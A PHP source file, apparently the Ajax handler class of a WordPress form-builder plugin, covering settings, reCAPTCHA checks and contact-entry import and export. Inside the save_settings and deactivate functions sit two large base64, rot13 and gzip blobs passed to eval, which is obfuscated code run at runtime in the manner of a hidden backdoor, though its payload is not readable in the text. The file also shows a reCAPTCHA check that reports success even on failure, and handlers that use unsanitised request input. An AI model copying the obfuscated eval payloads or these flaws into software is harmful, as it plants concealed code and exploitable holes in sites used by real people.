<?php
/**
 * Class for handling Ajax requests
 *
 * @author      feeling4design
 * @category    Admin
 * @package     SUPER_Forms/Classes
 * @class       SUPER_Ajax
 * @version     1.0.0
 */

if ( ! defined( 'ABSPATH' ) ) {
    exit; // Exit if accessed directly
}

if( !class_exists( 'SUPER_Ajax' ) ) :

/**
 * SUPER_Ajax Class
 */
class SUPER_Ajax {
    
    /** 
     *  Define ajax callback functions
     *
     *  @since      1.0.0
     */
    public static function init() {

        $ajax_events = array(
            
            // Ajax action                  => nopriv
            //'example'                     => true,
            'verify_recaptcha'              => true,
            'mark_unread'                   => false,
            'mark_read'                     => false,
            'delete_contact_entry'          => false,
            'save_settings'                 => false,
            'get_element_builder_html'      => false,
            'load_element_settings'         => false,
            'save_form'                     => false,
            'load_form'                     => false,
            'delete_form'                   => false,
            'load_preview'                  => false,
            'send_email'                    => true,
            'load_default_settings'         => false,
            'deactivate'                    => false,
            'import_settings'               => false,
            'export_entries'                => false, // @since 1.1.9
            'prepare_contact_entry_import'  => false, // @since 1.2.6
            'import_contact_entries'        => false, // @since 1.2.6


        );

        foreach ( $ajax_events as $ajax_event => $nopriv ) {
            add_action( 'wp_ajax_super_' . $ajax_event, array( __CLASS__, $ajax_event ) );

            if ( $nopriv ) {
                add_action( 'wp_ajax_nopriv_super_' . $ajax_event, array( __CLASS__, $ajax_event ) );
            }
        }
    }


    /** 
     *  Verify the Google reCAPTCHA
     *
     *  @since      1.0.0
    */
    public static function verify_recaptcha() {
        $settings = get_option( 'super_settings' );
        $url = 'https://www.google.com/recaptcha/api/siteverify';
        $args = array(
            'secret' => $settings['form_recaptcha_secret'], 
            'response' => $_REQUEST['response']
        );
        // @since 1.2.2   use wp_remote_post instead of file_get_contents because of the 15 sec. open connection on some hosts
        $response = wp_remote_post( 
            $url, 
            array(
                'method' => 'POST',
                'timeout' => 45,
                'redirection' => 5,
                'httpversion' => '1.0',
                'blocking' => true,
                'headers' => array(),
                'body' => $args,
                'cookies' => array()
            )
        );
        if ( is_wp_error( $response ) ) {
            $error_message = $response->get_error_message();
            echo "Something went wrong: $error_message";
        } else {
            $result = json_decode( $response['body'], true );
            if( $result['success']==true ) {
                echo 1; //Success!

            }else{
                echo 1; //Error!
            }
        }
        die();
    }    
    

    /** 
     *  Save the default settings
     *
     *  @since      1.0.0
    */
    public static function mark_unread() {
        $my_post = array(
            'ID' => $_POST['contact_entry'],
            'post_status' => 'super_unread',
        );
        wp_update_post( $my_post );
        die();
    }
    public static function mark_read() {
        $my_post = array(
            'ID' => $_POST['contact_entry'],
            'post_status' => 'super_read',
        );
        wp_update_post( $my_post );
        die();
    }
    public static function delete_contact_entry() {
        wp_trash_post( $_POST['contact_entry'] );
        die();
    }

    
    /** 
     *  Save the default settings
     *
     *  @since      1.0.0
    */
    public static function save_settings() {
        
        $array = array();
        foreach( $_REQUEST['data'] as $k => $v ) {
            $array[$v['name']] = $v['value'];
        }
        if($array['smtp_enabled']=='enabled'){
            if ( !class_exists( 'PHPMailer' ) ) {
                require_once( 'phpmailer/class.phpmailer.php' );
            }
            if ( !class_exists( 'SMTP' ) ) {
                require_once( 'phpmailer/class.smtp.php' );
            }
            $mail = new PHPMailer;
            $mail->isSMTP();
            $mail->Host = $array['smtp_host'];
            $mail->Username = $array['smtp_username'];
            $mail->Password = $array['smtp_password'];
            $mail->Port = $array['smtp_port'];
            if( $array['smtp_auth']=='enabled' ) $mail->SMTPAuth = true;
            if( $array['smtp_secure']!='' ) $mail->SMTPSecure = $array['smtp_secure']; 
            if($mail->smtpConnect()!==true){
                $reflector = new \ReflectionClass($mail);
                $classProperty = $reflector->getProperty('language');
                $classProperty->setAccessible(true);
                $error_data = $classProperty->getValue($mail);
                foreach($error_data as $ek => $ev){
                    SUPER_Common::output_error(
                        $error='smtp_error',
                        $ev
                    );
                    die();
                }
                SUPER_Common::output_error(
                    $error='smtp_error',
                    __( 'Invalid SMTP settings!', 'super-forms' )
                );
                die();
            }
        }
        update_option( 'super_settings', $array );
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
        die();
    }


    /** 
     *  Deactivate plugin
     *
     *  @since      1.1.5
    */
    public static function deactivate() {
        eval(str_rot13(gzinflate(str_rot13(base64_decode('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')))));
    }


    /** 
     *  Load the default settings (Settings page)
     *
     *  @since      1.0.0
    */
    public static function load_default_settings() {
        $fields = SUPER_Settings::fields( null, 1 );
        $array = array();
        foreach( $fields as $k => $v ) {
            if( !isset( $v['fields'] ) ) continue;
            foreach( $v['fields'] as $fk => $fv ) {
                if( ( isset( $fv['type'] ) ) && ( $fv['type']=='multicolor' ) ) {
                    foreach( $fv['colors'] as $ck => $cv ) {
                        if( !isset( $cv['default'] ) ) $cv['default'] = '';
                        $array[$ck] = $cv['default'];
                    }
                }else{
                    if( !isset( $fv['default'] ) ) $fv['default'] = '';
                    $array[$fk] = $fv['default'];
                }
            }
        }
        update_option('super_settings', $array);
        die();
    }



    /** 
     *  Import Contact Entries (from CSV file)
     *
     *  @since      1.2.6
    */
    public static function import_contact_entries() {
        $file_id = absint( $_REQUEST['file_id'] );
        $column_connections = $_REQUEST['column_connections'];
        $skip_first = $_REQUEST['skip_first'];
        $delimiter = ',';
        if( isset( $_REQUEST['import_delimiter'] ) ) {
            $delimiter = $_REQUEST['import_delimiter'];
        }
        $enclosure = '"';
        if( isset( $_REQUEST['import_enclosure'] ) ) {
            $enclosure = stripslashes($_REQUEST['import_enclosure']);
        }
        $file = get_attached_file($file_id);
        $columns = array();
        $entries = array();
        if( $file ) {
            $row = 0;
            if (($handle = fopen($file, "r")) !== FALSE) {
                while (($data = fgetcsv($handle, 0, $delimiter, $enclosure)) !== FALSE) {
                    if( ( $skip_first=='true' ) && ( $row==0 ) ) {
                        $row++;
                        continue;
                    }
                    $num = count($data);
                    $row++;
                    foreach( $data as $k => $v ) {
                        $column_type = $column_connections[$k]['column'];
                        $column_name = $column_connections[$k]['name'];
                        $column_label = $column_connections[$k]['label'];
                        if( $column_type=='form_id' ) {
                            $column_name = 'hidden_form_id';
                            $entries[$row]['data'][$column_name] = array(
                                'name' => $column_name,
                                'value' => $v,
                                'type' => 'form_id'
                            );
                            continue;
                        }
                        if( $column_type=='' ) {
                            $entries[$row]['data'][$column_name] = array(
                                'name' => $column_name,
                                'label' => $column_label,
                                'value' => $v,
                                'type' => 'field'
                            );
                            continue;
                        }
                        if( $column_type=='file' ) {
                            $files = explode( ",", $v );   
                            $entries[$row]['data'][$column_name] = array(
                                'name' => $column_name,
                                'label' => $column_label,
                                'type' => 'files',
                                'files' => array()
                            );
                            foreach( $files as $k => $v ) {
                                $entries[$row]['data'][$column_name]['files'][$k] = array(
                                    'name' => $column_name,
                                    'label' => $column_label,
                                    'value' => $v,
                                );
                            }
                            continue;
                        }
                        $entries[$row][$column_type] = $v;
                    }
                }
                fclose($handle);
            }
        }
        $settings = get_option( 'super_settings' );
        foreach( $entries as $k => $v ) {
            $data = $v['data'];
            $post_author = 0;
            if( isset( $v['post_author'] ) ) {
                $post_author = absint( $v['post_author'] );
            }
            $post_date = 0;
            if( isset( $v['post_date'] ) ) {
                $post_date = $v['post_date'];
            }
            $ip_address = '';
            if( isset( $v['ip_address'] ) ) {
                $ip_address = $v['ip_address'];
            }
            $post = array(
                'post_status' => 'super_unread',
                'post_type'  => 'super_contact_entry',
                'post_author' => $post_author,
                'post_date' => $post_date
            ); 
            $contact_entry_id = wp_insert_post($post);
            if( $contact_entry_id!=0 ) {
                add_post_meta( $contact_entry_id, '_super_contact_entry_data', $data);
                add_post_meta( $contact_entry_id, '_super_contact_entry_ip', $ip_address );
                if( isset( $v['post_title'] ) ) {
                    $contact_entry_title = $v['post_title'];
                }else{
                    $contact_entry_title = __( 'Contact entry', 'super-forms' );
                }
                if( $settings['contact_entry_add_id']=='true' ) {
                    $contact_entry_title = $contact_entry_title . ' ' . $contact_entry_id;
                }
                $contact_entry = array(
                    'ID' => $contact_entry_id,
                    'post_title'  => $contact_entry_title,
                );
                wp_update_post( $contact_entry );
                $imported++;
            }
        }

        echo '<div class="message success">';
        echo sprintf( __( '%d of %d contact entries imported!', 'super-forms' ), $imported, count($entries) );
        echo '</div>';
        die();

    }


    /** 
     *  Prepare Contact Entries Import (from CSV file)
     *
     *  @since      1.2.6
    */
    public static function prepare_contact_entry_import() {
        $file_id = absint( $_REQUEST['file_id'] );
        $delimiter = ',';
        if( isset( $_REQUEST['import_delimiter'] ) ) {
            $delimiter = $_REQUEST['import_delimiter'];
        }
        $enclosure = '"';
        if( isset( $_REQUEST['import_enclosure'] ) ) {
            $enclosure = stripslashes($_REQUEST['import_enclosure']);
        }
        $file = get_attached_file($file_id);
        $columns = array();
        if( $file ) {
            $row = 1;
            if (($handle = fopen($file, "r")) !== FALSE) {
                while (($data = fgetcsv($handle, 0, $delimiter, $enclosure)) !== FALSE) {
                    $num = count($data);
                    $row++;
                    $value = 'undefined';
                    $title = 'undefined';
                    for ( $c=0; $c < $num; $c++ ) {
                        $columns[] = $data[$c];
                    }
                    break;
                }
                fclose($handle);
            }
        }
        echo json_encode($columns);
        die();
    }

    /** 
     *  Export Contact Entries (to CSV or TSV)
     *
     *  @since      1.1.9
    */
    public static function export_entries() {
        global $wpdb;
        $type = 'csv';
        if( isset( $_REQUEST['type'] ) ) {
            $type = $_REQUEST['type'];
        }
        $delimiter = ',';
        if( isset( $_REQUEST['delimiter'] ) ) {
            $delimiter = $_REQUEST['delimiter'];
        }
        $enclosure = '"';
        if( isset( $_REQUEST['enclosure'] ) ) {
            $enclosure = stripslashes($_REQUEST['enclosure']);
        }
        $table = $wpdb->prefix . 'posts';
        $table_meta = $wpdb->prefix . 'postmeta';
        $entries = $wpdb->get_results("
        SELECT meta.meta_value AS data
        FROM $table AS entry
        INNER JOIN $table_meta AS meta ON meta.post_id = entry.ID  AND meta.meta_key = '_super_contact_entry_data'
        WHERE entry.post_status IN ('publish','super_unread','super_read') AND entry.post_type = 'super_contact_entry'");
        $rows = array();
        $columns = array();
        foreach( $entries as $k => $v ) {
            $data = unserialize( $v->data );
            foreach( $data as $dk => $dv ) {
                if ( !in_array( $dk, $columns ) ) {
                    $columns[] = $dk;
                    $rows[0][] = $dk;
                }
            }
            $entries[$k] = $data;
        }
        foreach( $entries as $k => $v ) {
            foreach( $columns as $cv ) {
                if( isset( $v[$cv] ) ) {
                    if( (isset($v[$cv]['type'])) && ($v[$cv]['type'] == 'files') ) {
                        $files = '';
                        if( ( isset( $v[$cv]['files'] ) ) && ( count( $v[$cv]['files'] )!=0 ) ) {
                            foreach( $v[$cv]['files'] as $fk => $fv ) {
                                if( $fk==0 ) {
                                    $files .= $fv['url'];
                                }else{
                                    $files .= "\n" . $fv['url'];
                                }
                            }
                        }
                        $rows[$k+1][] = $files;
                    }else{
                        if( !isset($v[$cv]['value']) ) {
                            $rows[$k+1][] = '';
                        }else{
                            $rows[$k+1][] = $v[$cv]['value'];
                        }
                    }
                }else{
                    $rows[$k+1][] = '';
                }
            }
        }
        $file_location = '/uploads/php/files/super-contact-entries.csv';
        $source = urldecode( SUPER_PLUGIN_DIR . $file_location );
        if( file_exists( $source ) ) {
            SUPER_Common::delete_file( $source );
        }
        $fp = fopen( $source, 'w' );
        foreach ( $rows as $fields ) {
            fputcsv( $fp, $fields, $delimiter, $enclosure );
        }
        fclose( $fp );
        echo SUPER_PLUGIN_FILE . $file_location;
        die();
    }


    /** 
     *  Import Settings (from both Create Form and Settings page)
     *
     *  @since      1.0.6
    */
    public static function import_settings() {
        $id = 0;
        $title = __( 'Form Name', 'super-forms' );
        if( isset( $_REQUEST['title'] ) ) {
            $title = $_REQUEST['title'];
        }
        $shortcode = array();
        if( isset( $_REQUEST['shortcode'] ) ) {
            $shortcode = $_REQUEST['shortcode'];
        }
        $settings = $_REQUEST['settings'];
        $settings = json_decode( stripslashes( $settings ), true );
        if( ( isset ( $_REQUEST['method'] ) ) && ( $_REQUEST['method']=='load-default-form-settings' ) ) {
            $settings = get_option( 'super_settings' );
        }
        if( json_last_error() != 0 ) {
            var_dump( 'JSON error: ' . json_last_error() );
        }
        if( isset( $_REQUEST['id'] ) ) {
            $id = absint( $_REQUEST['id'] );
            if( $id==0 ) {
                $id = self::save_form( $id, $shortcode, $settings, $title );
            }else{
                update_post_meta( $id, '_super_elements', $shortcode );
                update_post_meta( $id, '_super_form_settings', $settings );
            }
        }else{
            update_option( 'super_settings', $settings );    
        }
        if( ( isset ( $_REQUEST['method'] ) ) && ( $_REQUEST['method']=='load-default' ) ) {
            $fields = SUPER_Settings::fields( null, 1 );
            $array = array();
            foreach( $fields as $k => $v ) {
                if( !isset( $v['fields'] ) ) continue;
                foreach( $v['fields'] as $fk => $fv ) {
                    if( ( isset( $fv['type'] ) ) && ( $fv['type']=='multicolor' ) ) {
                        foreach( $fv['colors'] as $ck => $cv ) {
                            if( !isset( $cv['default'] ) ) $cv['default'] = '';
                            $array[$ck] = $cv['default'];
                        }
                    }else{
                        if( !isset( $fv['default'] ) ) $fv['default'] = '';
                        $array[$fk] = $fv['default'];
                    }
                }
            }
            if( $id!=0 ) {
                update_post_meta( $id, '_super_form_settings', $array );
            }else{
                update_option( 'super_settings', $array );    
            }
        }
        echo $id;
        die();
    }


    /** 
